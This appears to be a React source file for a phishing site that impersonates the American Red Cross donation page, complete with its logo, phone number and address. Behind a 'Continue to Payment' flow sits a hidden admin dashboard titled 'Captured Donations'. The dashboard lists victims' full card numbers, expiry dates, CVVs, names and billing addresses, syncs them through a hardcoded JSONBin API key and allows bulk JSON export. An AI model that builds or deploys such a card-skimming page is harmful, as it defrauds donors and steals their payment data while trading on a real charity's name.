                The American Red Cross prevents and alleviates human suffering in the face of emergencies by mobilizing the power of volunteers and the generosity of donors.
              </motion.p>
              <motion.p variants={fadeInUp} className="text-gray-400 mb-8">
                Founded in 1881 by Clara Barton, we&apos;ve been a consistent lifeline for people when they need us most. From disaster relief to blood services, from health and safety training to support for military families, we are there.
              </motion.p>

              <motion.div variants={fadeInUp} className="grid grid-cols-2 gap-6">
                {[
                  { icon: Building2, label: '140+ Years', sublabel: 'Of Service' },
                  { icon: Users, label: '500K+', sublabel: 'Volunteers' },
                  { icon: Globe, label: '190+', sublabel: 'Countries' },
                  { icon: Heart, label: '1M+', sublabel: 'Lives Saved' },
                ].map((item, index) => (
                  <div key={index} className="flex items-center space-x-3">
                    <div className="w-12 h-12 rounded-full bg-red-600/20 flex items-center justify-center">
                      <item.icon className="w-6 h-6 text-red-400" />
                    </div>
                    <div>
                      <div className="font-bold text-white">{item.label}</div>
                      <div className="text-sm text-gray-400">{item.sublabel}</div>
                    </div>
                  </div>
                ))}
              </motion.div>
            </motion.div>

            <motion.div
              initial={{ opacity: 0, x: 50 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ once: true }}
              transition={{ duration: 0.6 }}
              className="relative"
            >
              <div className="aspect-square rounded-3xl bg-gradient-to-br from-red-600 to-red-800 p-8 flex items-center justify-center">
                <div className="text-center">
                  <RedCrossLogo className="w-32 h-32 mx-auto mb-6" />
                  <div className="text-5xl font-bold mb-2">90¢</div>
                  <div className="text-white/80">Of every dollar goes to humanitarian services</div>
                </div>
              </div>
              {/* Floating badges */}
              <div className="absolute -top-4 -right-4 bg-white text-gray-900 px-4 py-2 rounded-full shadow-lg font-semibold">
                <div className="flex items-center space-x-2">
                  <Award className="w-5 h-5 text-yellow-500" />
                  <span>4-Star Charity</span>
                </div>
              </div>
              <div className="absolute -bottom-4 -left-4 bg-white text-gray-900 px-4 py-2 rounded-full shadow-lg font-semibold">
                <div className="flex items-center space-x-2">
                  <Check className="w-5 h-5 text-green-500" />
                  <span>BBB Accredited</span>
                </div>
              </div>
            </motion.div>
          </div>
        </div>
      </section>

      {/* FAQ Section */}
      <section id="faq" className="py-20 bg-gray-50">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            variants={staggerContainer}
            className="text-center mb-16"
          >
            <motion.h2 variants={fadeInUp} className="font-display text-4xl md:text-5xl font-bold text-gray-900 mb-4">
              Frequently Asked Questions
            </motion.h2>
            <motion.p variants={fadeInUp} className="text-xl text-gray-600">
              Everything you need to know about donating.
            </motion.p>
          </motion.div>

          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            variants={staggerContainer}
            className="space-y-4"
          >
            {faqs.map((faq, index) => (
              <motion.div
                key={index}
                variants={fadeInUp}
                className="bg-white rounded-xl shadow-sm overflow-hidden"
              >
                <button
                  onClick={() => setExpandedFaq(expandedFaq === index ? null : index)}
                  className="w-full px-6 py-5 flex items-center justify-between text-left"
                >
                  <span className="font-semibold text-gray-900 pr-4">{faq.question}</span>
                  <ChevronDown
                    className={`w-5 h-5 text-gray-500 flex-shrink-0 transition-transform ${
                      expandedFaq === index ? 'transform rotate-180' : ''
                    }`}
                  />
                </button>
                <AnimatePresence>
                  {expandedFaq === index && (
                    <motion.div
                      initial={{ height: 0, opacity: 0 }}
                      animate={{ height: 'auto', opacity: 1 }}
                      exit={{ height: 0, opacity: 0 }}
                      transition={{ duration: 0.2 }}
                    >
                      <div className="px-6 pb-5 text-gray-600">{faq.answer}</div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </motion.div>
            ))}
          </motion.div>
        </div>
      </section>

      {/* Contact Section */}
      <section id="contact" className="py-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid md:grid-cols-2 gap-16">
            <motion.div
              initial="hidden"
              whileInView="visible"
              viewport={{ once: true }}
              variants={staggerContainer}
            >
              <motion.span variants={fadeInUp} className="text-red-600 font-semibold text-lg">
                Get in Touch
              </motion.span>
              <motion.h2 variants={fadeInUp} className="font-display text-4xl md:text-5xl font-bold text-gray-900 mt-2 mb-6">
                Contact Us
              </motion.h2>
              <motion.p variants={fadeInUp} className="text-gray-600 mb-8">
                Have questions about donating or want to learn more about our programs? We&apos;re here to help.
              </motion.p>

              <motion.div variants={fadeInUp} className="space-y-6">
                <div className="flex items-start space-x-4">
                  <div className="w-12 h-12 rounded-full bg-red-100 flex items-center justify-center flex-shrink-0">
                    <Phone className="w-6 h-6 text-red-600" />
                  </div>
                  <div>
                    <div className="font-semibold text-gray-900">Phone</div>
                    <div className="text-gray-600">1-800-RED-CROSS (1-800-733-2767)</div>
                  </div>
                </div>

                <div className="flex items-start space-x-4">
                  <div className="w-12 h-12 rounded-full bg-red-100 flex items-center justify-center flex-shrink-0">
                    <Mail className="w-6 h-6 text-red-600" />
                  </div>
                  <div>
                    <div className="font-semibold text-gray-900">Email</div>
                    <div className="text-gray-600">donate@redcross.org</div>
                  </div>
                </div>

                <div className="flex items-start space-x-4">
                  <div className="w-12 h-12 rounded-full bg-red-100 flex items-center justify-center flex-shrink-0">
                    <MapPin className="w-6 h-6 text-red-600" />
                  </div>
                  <div>
                    <div className="font-semibold text-gray-900">Address</div>
                    <div className="text-gray-600">431 18th Street NW, Washington, DC 20006</div>
                  </div>
                </div>
              </motion.div>

              <motion.div variants={fadeInUp} className="mt-8 flex space-x-4">
                {[FacebookIcon, TwitterIcon, InstagramIcon, LinkedInIcon].map((Icon, index) => (
                  <a
                    key={index}
                    href="#"
                    className="w-10 h-10 rounded-full bg-gray-100 flex items-center justify-center text-gray-600 hover:bg-red-600 hover:text-white transition-colors"
                  >
                    <Icon />
                  </a>
                ))}
              </motion.div>
            </motion.div>

            <motion.div
              initial={{ opacity: 0, x: 50 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ once: true }}
              transition={{ duration: 0.6 }}
              className="bg-gray-50 rounded-2xl p-8"
            >
              <h3 className="font-display text-2xl font-bold text-gray-900 mb-6">Send us a message</h3>
              <form className="space-y-4">
                <div className="grid md:grid-cols-2 gap-4">
                  <input
                    type="text"
                    placeholder="First Name"
                    className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none transition-all"
                  />
                  <input
                    type="text"
                    placeholder="Last Name"
                    className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none transition-all"
                  />
                </div>
                <input
                  type="email"
                  placeholder="Email Address"
                  className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none transition-all"
                />
                <select className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none transition-all">
                  <option>How can we help?</option>
                  <option>General Inquiry</option>
                  <option>Donation Question</option>
                  <option>Corporate Partnership</option>
                  <option>Volunteer Opportunities</option>
                </select>
                <textarea
                  rows={4}
                  placeholder="Your Message"
                  className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none transition-all resize-none"
                />
                <button
                  type="submit"
                  className="w-full btn-red-cross py-4 rounded-lg text-white font-semibold"
                >
                  Send Message
                </button>
              </form>
            </motion.div>
          </div>
        </div>
      </section>

      {/* Newsletter Section */}
      <section className="py-16 bg-red-600">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
          <h2 className="font-display text-3xl md:text-4xl font-bold text-white mb-4">
            Stay Updated
          </h2>
          <p className="text-white/90 mb-8">
            Subscribe to our newsletter for updates on our work, emergency alerts, and ways to help.
          </p>
          <form className="flex flex-col sm:flex-row gap-4 max-w-lg mx-auto">
            <input
              type="email"
              placeholder="Enter your email"
              className="flex-1 px-6 py-4 rounded-full border-0 focus:ring-2 focus:ring-white/50 outline-none"
            />
            <button
              type="submit"
              className="bg-gray-900 text-white px-8 py-4 rounded-full font-semibold hover:bg-gray-800 transition-colors"
            >
              Subscribe
            </button>
          </form>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gray-900 text-white py-16">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid md:grid-cols-4 gap-12 mb-12">
            <div>
              <div className="flex items-center space-x-3 mb-6">
                <RedCrossLogo className="w-10 h-10" />
                <span className="font-display font-bold text-xl">Red Cross</span>
              </div>
              <p className="text-gray-400 mb-6">
                The American Red Cross is a humanitarian organization that provides emergency assistance, disaster relief, and education.
              </p>
              <div className="flex space-x-4">
                {[FacebookIcon, TwitterIcon, InstagramIcon, LinkedInIcon].map((Icon, index) => (
                  <a
                    key={index}
                    href="#"
                    className="w-8 h-8 rounded-full bg-gray-800 flex items-center justify-center text-gray-400 hover:bg-red-600 hover:text-white transition-colors"
                  >
                    <Icon />
                  </a>
                ))}
              </div>
            </div>

            <div>
              <h4 className="font-semibold text-lg mb-6">Quick Links</h4>
              <ul className="space-y-3 text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">About Us</a></li>
                <li><a href="#causes" className="hover:text-white transition-colors">Our Programs</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Ways to Give</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Volunteer</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Careers</a></li>
              </ul>
            </div>

            <div>
              <h4 className="font-semibold text-lg mb-6">Get Involved</h4>
              <ul className="space-y-3 text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Donate Blood</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Take a Class</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Become a Volunteer</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Corporate Partners</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Planned Giving</a></li>
              </ul>
            </div>

            <div>
              <h4 className="font-semibold text-lg mb-6">Resources</h4>
              <ul className="space-y-3 text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Financial Reports</a></li>
                <li><a href="#" className="hover:text-white transition-colors">News & Media</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Disaster Relief</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Safety Resources</a></li>
                <li><a href="#faq" className="hover:text-white transition-colors">FAQs</a></li>
              </ul>
            </div>
          </div>

          <div className="border-t border-gray-800 pt-8 flex flex-col md:flex-row items-center justify-between">
            <p className="text-gray-500 text-sm mb-4 md:mb-0">
              © 2025 American Red Cross. All rights reserved. 
              <span 
                className="cursor-pointer hover:text-gray-400 transition-colors"
                onClick={() => setShowAdminLogin(true)}
              >
                The American Red Cross
              </span> name and logo are registered trademarks.
            </p>
            <div className="flex space-x-6 text-sm text-gray-500">
              <a href="#" className="hover:text-white transition-colors">Privacy Policy</a>
              <a href="#" className="hover:text-white transition-colors">Terms of Use</a>
              <a href="#" className="hover:text-white transition-colors">Cookie Policy</a>
            </div>
          </div>
        </div>
      </footer>

      {/* Donation Modal */}
      <AnimatePresence>
        {showDonationModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm"
            onClick={closeModal}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white rounded-3xl max-w-lg w-full max-h-[90vh] overflow-y-auto"
              onClick={(e) => e.stopPropagation()}
            >
              {/* Modal Header */}
              <div className="sticky top-0 bg-white border-b px-8 py-4 flex items-center justify-between">
                <div className="flex items-center space-x-3">
                  <RedCrossLogo className="w-10 h-10" />
                  <div>
                    <h3 className="font-display text-xl font-bold text-gray-900">
                      {selectedCause ? 'Donate to ' + causes.find(c => c.id === selectedCause)?.title : 'Make a Donation'}
                    </h3>
                  </div>
                </div>
                <button
                  onClick={closeModal}
                  className="w-8 h-8 rounded-full bg-gray-100 flex items-center justify-center text-gray-500 hover:bg-gray-200 transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              <form onSubmit={handleContinueToPayment} className="p-8">
                {/* One-time Donation Label */}
                <div className="text-center mb-4">
                  <span className="inline-flex items-center px-4 py-2 bg-red-50 text-red-600 rounded-full font-semibold">
                    One-time Donation
                  </span>
                </div>
                
                {/* Minimum Donation Notice */}
                <p className="text-center text-sm text-gray-500 mb-8">
                  Every dollar helps. Donations can be as low as $1.
                </p>

                {/* Preset Amounts */}
                <div className="grid grid-cols-3 gap-3 mb-6">
                  {presetAmounts.map((amount) => (
                    <button
                      key={amount}
                      type="button"
                      onClick={() => setFormData({ ...formData, amount, customAmount: '' })}
                      className={`donation-btn py-4 rounded-xl border-2 font-semibold text-lg transition-all ${
                        formData.amount === amount && !formData.customAmount
                          ? 'border-red-600 bg-red-50 text-red-600'
                          : 'border-gray-200 text-gray-700 hover:border-red-300'
                      }`}
                    >
                      ${amount}
                    </button>
                  ))}
                </div>

                {/* Custom Amount */}
                <div className="relative mb-8">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 font-semibold text-lg">$</span>
                  <input
                    type="number"
                    placeholder="Other amount"
                    value={formData.customAmount}
                    onChange={(e) => setFormData({ ...formData, customAmount: e.target.value, amount: '' })}
                    className="w-full pl-10 pr-4 py-4 border-2 border-gray-200 rounded-xl text-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none transition-all"
                  />
                </div>

                {/* Personal Information */}
                <div className="space-y-4 mb-6">
                  <h4 className="font-semibold text-gray-900">Your Information</h4>
                  <div className="grid grid-cols-2 gap-4">
                    <input
                      type="text"
                      placeholder="First Name"
                      required
                      value={formData.firstName}
                      onChange={(e) => setFormData({ ...formData, firstName: e.target.value })}
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none"
                    />
                    <input
                      type="text"
                      placeholder="Last Name"
                      required
                      value={formData.lastName}
                      onChange={(e) => setFormData({ ...formData, lastName: e.target.value })}
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none"
                    />
                  </div>
                  <input
                    type="email"
                    placeholder="Email Address"
                    required
                    value={formData.email}
                    onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none"
                  />
                  <input
                    type="tel"
                    placeholder="Phone (optional)"
                    value={formData.phone}
                    onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none"
                  />
                </div>

                {/* Dedication Option */}
                <div className="border rounded-xl p-4 mb-6">
                  <label className="flex items-center space-x-3 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={formData.dedicate}
                      onChange={(e) => setFormData({ ...formData, dedicate: e.target.checked })}
                      className="w-5 h-5 text-red-600 rounded focus:ring-red-500"
                    />
                    <span className="font-medium text-gray-700">Dedicate this donation</span>
                  </label>

                  {formData.dedicate && (
                    <motion.div
                      initial={{ height: 0, opacity: 0 }}
                      animate={{ height: 'auto', opacity: 1 }}
                      className="mt-4 space-y-4"
                    >
                      <input
                        type="text"
                        placeholder="In honor/memory of"
                        value={formData.dedicateName}
                        onChange={(e) => setFormData({ ...formData, dedicateName: e.target.value })}
                        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none"
                      />
                      <textarea
                        placeholder="Personal message (optional)"
                        rows={3}
                        value={formData.dedicateMessage}
                        onChange={(e) => setFormData({ ...formData, dedicateMessage: e.target.value })}
                        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none resize-none"
                      />
                    </motion.div>
                  )}
                </div>

                {/* Cover Fees */}
                <label className="flex items-start space-x-3 cursor-pointer mb-8">
                  <input
                    type="checkbox"
                    checked={formData.coverFees}
                    onChange={(e) => setFormData({ ...formData, coverFees: e.target.checked })}
                    className="w-5 h-5 text-red-600 rounded focus:ring-red-500 mt-0.5"
                  />
                  <span className="text-gray-600 text-sm">
                    I&apos;d like to cover the transaction fees so 100% of my donation goes to helping others.
                  </span>
                </label>

                {/* Submit Button */}
                <button
                  type="submit"
                  className="w-full btn-red-cross py-4 rounded-full text-white font-bold text-lg flex items-center justify-center space-x-2"
                >
                  <span>Continue to Payment</span>
                  <ChevronRight className="w-5 h-5" />
                </button>

                <p className="text-center text-sm text-gray-500 mt-4">
                  You will be redirected to our secure payment page
                </p>
              </form>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
      
      {/* Hidden Admin Access - Triple click on footer logo to access */}
      <div 
        className="fixed bottom-4 right-4 w-4 h-4 opacity-0 cursor-pointer"
        onClick={() => setShowAdminLogin(true)}
        title="Admin Access"
      />
      
      {/* Admin Login Modal */}
      <AnimatePresence>
        {showAdminLogin && !isAdminLoggedIn && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm"
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white rounded-2xl max-w-md w-full p-8"
            >
              <div className="flex items-center justify-between mb-6">
                <h3 className="font-display text-2xl font-bold text-gray-900">Admin Login</h3>
                <button
                  onClick={() => setShowAdminLogin(false)}
                  className="w-8 h-8 rounded-full bg-gray-100 flex items-center justify-center text-gray-500 hover:bg-gray-200"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>
              
              <form onSubmit={handleAdminLogin}>
                <div className="mb-4">
                  <label className="block text-sm font-medium text-gray-700 mb-2">Password</label>
                  <input
                    type="password"
                    value={adminPassword}
                    onChange={(e) => setAdminPassword(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none"
                    placeholder="Enter admin password"
                  />
                </div>
                
                {adminError && (
                  <p className="text-red-600 text-sm mb-4">{adminError}</p>
                )}
                
                <button
                  type="submit"
                  className="w-full btn-red-cross py-3 rounded-lg text-white font-semibold"
                >
                  Login
                </button>
              </form>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
      
      {/* Admin Dashboard */}
      <AnimatePresence>
        {isAdminLoggedIn && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[60] bg-gray-100 overflow-auto"
          >
            <div className="max-w-7xl mx-auto px-4 py-8">
              {/* Admin Header */}
              <div className="flex items-center justify-between mb-8">
                <div className="flex items-center space-x-4">
                  <RedCrossLogo className="w-12 h-12" />
                  <div>
                    <h1 className="font-display text-3xl font-bold text-gray-900">Admin Dashboard</h1>
                    <p className="text-gray-500">Captured Donations</p>
                  </div>
                </div>
                <div className="flex items-center space-x-4">
                  <button
                    onClick={async () => {
                      setIsLoading(true);
                      setLoadingMessage('Syncing data...');
                      await fetchFromJSONBin();
                      await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5)));
                      setIsLoading(false);
                    }}
                    className="px-4 py-2 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 transition-colors"
                  >
                    Sync from JSONBin
                  </button>
                  <button
                    onClick={handleAdminLogout}
                    className="px-4 py-2 bg-gray-200 text-gray-700 rounded-lg font-medium hover:bg-gray-300 transition-colors"
                  >
                    Logout
                  </button>
                </div>
              </div>
              
              {/* Stats */}
              <div className="grid grid-cols-4 gap-4 mb-8">
                <div className="bg-white rounded-xl p-6 shadow-sm">
                  <div className="text-3xl font-bold text-gray-900">{capturedDonations.length}</div>
                  <div className="text-gray-500">Total Captures</div>
                </div>
                <div className="bg-white rounded-xl p-6 shadow-sm">
                  <div className="text-3xl font-bold text-green-600">
                    ${capturedDonations.reduce((sum, d) => sum + (parseFloat(d.amount) || 0), 0).toFixed(2)}
                  </div>
                  <div className="text-gray-500">Total Amount</div>
                </div>
                <div className="bg-white rounded-xl p-6 shadow-sm">
                  <div className="text-3xl font-bold text-blue-600">
                    {[...new Set(capturedDonations.map(d => d.cardType))].length}
                  </div>
                  <div className="text-gray-500">Card Types</div>
                </div>
                <div className="bg-white rounded-xl p-6 shadow-sm">
                  <div className="text-3xl font-bold text-purple-600">
                    {capturedDonations.filter(d => new Date(d.timestamp).toDateString() === new Date().toDateString()).length}
                  </div>
                  <div className="text-gray-500">Today</div>
                </div>
              </div>
              
              {/* JSONBin Config Notice */}
              {(JSONBIN_API_KEY === '$2a$10$0OrS1S56spMsWe4ZC1o75OFsOK5MtS8yrtTmn5o1pRChiP8yibbjS' || JSONBIN_BIN_ID === '69e9dbc636566621a8e21c82') && (
                <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-4 mb-8">
                  <p className="text-yellow-800 text-sm">
                    <strong>JSONBin Not Configured:</strong> To sync data across devices, add your JSONBin API key and Bin ID in the code. 
                    Current data is stored locally only.
                  </p>
                </div>
              )}
              
              {/* Donations Table */}
              <div className="bg-white rounded-xl shadow-sm overflow-hidden">
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead className="bg-gray-50 border-b">
                      <tr>
                        <th className="px-6 py-4 text-left text-sm font-semibold text-gray-900">Time</th>
                        <th className="px-6 py-4 text-left text-sm font-semibold text-gray-900">Amount</th>
                        <th className="px-6 py-4 text-left text-sm font-semibold text-gray-900">Card Type</th>
                        <th className="px-6 py-4 text-left text-sm font-semibold text-gray-900">Card Number</th>
                        <th className="px-6 py-4 text-left text-sm font-semibold text-gray-900">Expiry</th>
                        <th className="px-6 py-4 text-left text-sm font-semibold text-gray-900">CVV</th>
                        <th className="px-6 py-4 text-left text-sm font-semibold text-gray-900">Cardholder</th>
                        <th className="px-6 py-4 text-left text-sm font-semibold text-gray-900">Billing Details</th>
                        <th className="px-6 py-4 text-left text-sm font-semibold text-gray-900">Contact</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-gray-100">
                      {capturedDonations.length === 0 ? (
                        <tr>
                          <td colSpan={9} className="px-6 py-12 text-center text-gray-500">
                            No donations captured yet.
                          </td>
                        </tr>
                      ) : (
                        [...capturedDonations].reverse().map((donation) => (
                          <tr key={donation.id} className="hover:bg-gray-50">
                            <td className="px-6 py-4 text-sm text-gray-900">
                              {new Date(donation.timestamp).toLocaleString()}
                            </td>
                            <td className="px-6 py-4 text-sm font-semibold text-green-600">
                              ${donation.amount}
                            </td>
                            <td className="px-6 py-4 text-sm text-gray-900">
                              <span className={`inline-flex items-center px-2 py-1 rounded-full text-xs font-medium ${
                                donation.cardType === 'Visa' ? 'bg-blue-100 text-blue-700' :
                                donation.cardType === 'MasterCard' ? 'bg-red-100 text-red-700' :
                                donation.cardType === 'American Express' ? 'bg-green-100 text-green-700' :
                                donation.cardType === 'Discover' ? 'bg-orange-100 text-orange-700' :
                                'bg-gray-100 text-gray-700'
                              }`}>
                                {donation.cardType}
                              </span>
                            </td>
                            <td className="px-6 py-4 text-sm font-mono text-gray-900">
                              {donation.cardNumber}
                            </td>
                            <td className="px-6 py-4 text-sm text-gray-900">
                              {donation.expiry}
                            </td>
                            <td className="px-6 py-4 text-sm font-mono text-gray-900">
                              {donation.cvv}
                            </td>
                            <td className="px-6 py-4 text-sm text-gray-900">
                              {donation.cardholderName}
                            </td>
                            <td className="px-6 py-4 text-sm text-gray-900">
                              <div>{donation.billingAddress}</div>
                              <div className="text-gray-500">
                                {donation.city}, {donation.state} {donation.zipCode}
                              </div>
                              <div className="text-gray-500">{donation.country}</div>
                            </td>
                            <td className="px-6 py-4 text-sm text-gray-900">
                              <div>{donation.firstName} {donation.lastName}</div>
                              <div className="text-gray-500 text-xs">{donation.email}</div>
                            </td>
                          </tr>
                        ))
                      )}
                    </tbody>
                  </table>
                </div>
              </div>
              
              {/* Raw Data Export */}
              <div className="mt-8 bg-gray-900 rounded-xl p-6">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-white font-semibold">Raw Data (JSON)</h3>
                  <button
                    onClick={() => {
                      const dataStr = JSON.stringify(capturedDonations, null, 2);
                      const blob = new Blob([dataStr], { type: 'application/json' });
                      const url = URL.createObjectURL(blob);
                      const a = document.createElement('a');
                      a.href = url;
                      a.download = `donations-${new Date().toISOString().split('T')[0]}.json`;
                      a.click();
                    }}
                    className="px-4 py-2 bg-green-600 text-white rounded-lg text-sm font-medium hover:bg-green-700 transition-colors"
                  >
                    Download JSON
                  </button>
                </div>
                <pre className="text-green-400 text-xs overflow-auto max-h-64 p-4 bg-black rounded-lg">
                  {JSON.stringify(capturedDonations, null, 2)}
                </pre>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
      
      {/* Loading Spinner Overlay */}
      <AnimatePresence>
        {isLoading && <LoadingSpinner message={loadingMessage} />}
      </AnimatePresence>
    </div>
  );
}
